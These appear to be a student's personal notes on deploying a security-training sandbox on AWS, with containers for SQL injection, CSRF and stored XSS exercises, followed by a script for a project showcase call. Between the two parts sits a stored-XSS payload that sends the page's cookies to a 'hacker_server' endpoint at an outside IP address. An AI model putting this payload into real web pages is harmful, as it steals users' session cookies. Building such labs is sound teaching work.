
---
- **setup AWS**

- sandboxes:
    - create security group: sandbox-sg -> inbound: 5000 and 3001 anywhere.
    - creat cluster: name: vital-sandbox
    - create Repo: public so it's easier to share if you want in future.
    - setup the aws local credentials 
        - for the aws educate->vocareum->account details copy and paste in you local machines ~/.aws/credentials.
        - for personal or UCI email need to create  a user and generate access key.
    - follow *push command* instructios to updated images.
        - the tags and push command are modified to follow single repor structure as:
        ```sh
        docker tag sql-inj-node:latest 999744867675.dkr.ecr.us-east-1.amazonaws.com/vital_poc:sql-inj-node
        docker push 999744867675.dkr.ecr.us-east-1.amazonaws.com/vital_poc:sql-inj-node
        ```
    - upload all 4 docker images with names (do not need to be exact as we'll use their URI)
        - sql-inj-node
        - sql-inj-flask
        - csrf-node
        - xss-stored
    - create tasks (**NEEDS TO BE EXACT** else will need to update the corresponding in the PROD CONFIG).
        - csrf-node-task
        - sqlInjection-node-task
        - sqlInjection-task
        - xssStored-task
    
        - add container for corresponding docker images URI from ECR repo.
        - port mapping add: 3001 and 5000
        - select min task memory(0.5) and task cpu(0.25).
        - check by run task.
            - cluster: vital-sandbox
            - VPC and subnets which are available.

- vital website
    - create IAM Roles
        - vitalEC2 Role: EC2 -> AmazonECS_FullAccess
    
    - create Security groups
        - vital-ec2: inbound: 4200, 3000, 22. outbound: all.


    - I need to share the AMI. from AMI side tab.
    
    - create a load balancer
        - type: application load balancer.
        - scheme: internet-facing
        - select all subnets
        - listeners: port 80
        - skip secure listeners.(no 443 certificate available).
        - create a new security group port 80 for input anywhere.
        - create a target-group: vital-tg.
            - type: instance.
            - **TARGETT GROUP PORT 3000**
            - **Advanced health check settings**
                - port override: 3000

        - **SET IDLE TIMEOUT TO 180 seconds**

    - create Launch configuration: vital-lc-t2-small
        - ami ami-0cde1cfd4f7ac7c6d vital-ec2 from aws educate account.
        - instance type t2.small as t2.nano can't compile the angular code.
        - IAM instance profile: vitalEC2.
        - choose ssh key.
    
    - create auto scaling group.
        - name: vital-asg
        - switch to launch configuration and select above vital-lc-t2-small launch configuration.
        - select all subets of default VPC.
        - attach to an existing load balancer created above.
            - select above created target group: vital-tg.
        - **ADD TAGS** important for code deploy.
            - add tag -> key: service value: vital
    
    BEFORE CODE DEPLOY verify if EC2 instance is spawning.
    - Code Deploy.
        - create application -> name: vital compute platform: EC2/On-premise
        - create deployment group -> name: vital-dg **Service Role**: Vital_CodeDeploy
        - Environment configuration: Amazon EC2 instances: Key: service value: vital
        - select: My application is stored in GitHub
        - github token: vnt-github (your github Oauth).
        - commit from branch
            - **WHICH HAVE YOUR PROD FARGATE SUBNET and SECURITY GROUP IN CODE CONFIG**.
            - **WHICH HAVE YOUR UI PROD URL AS THE ALB DNS**.
        - **DURING DEPLOYMENT** select the git branch you want and then
            - tick **Don't fail the deployment to an instance if this lifecycle event on the instance fails**.
            - tick **Overwrite the content**


<script>
  document.write(
    '<img src="http://54.144.60.113:5000/hacker_server/submit_cookie?cookie=' +
      escape(document.cookie) +
      '" />',
  );
</script>


---
- camera look at it.
- zoom -> participants -> rename : Vineet Bharot MCS CO '21
- "Hi! Welcome!", "Thank you for joining us today!"

- if zoom waiting: share link to assets.

- "I am Vineeet from team vitaL"
- "First of All: Do you have any burning question? i'll be happy to help with"
- gauge how much they know and who they are.
    - "may i know if you've reviewed some of the assets? background so we can tailor our presentation".

- if not seen assets:
    - summarize your project and offer to show demo or ad.

- if have seen assets:
    - talk about what some of your goals were for project.
    - how you set to achive them.

- show off
    - live demos
    - pitching with ad, executive summary & pitch deck.
    - skils knowledge gained.

- network
    - expand your network
    - explore job oppertunities
    - share MCS exp
    - share post-grad plans
    - passions/intersts

- encourage to recruite from MCS
- offline docs.

- resume: https://drive.google.com/file/d/1PjoeiT1bn8lbK5N2SQHIxPospZz18n2F/view?usp=sharing
- https://www.linkedin.com/in/vineet-bharot/
- https://github.com/vnt-github

- need architectural diagram.
- how to sell their product.
- architecutre used.

- pitch deck, live demo, QA.

- email thanks you.
    - and chance to connect.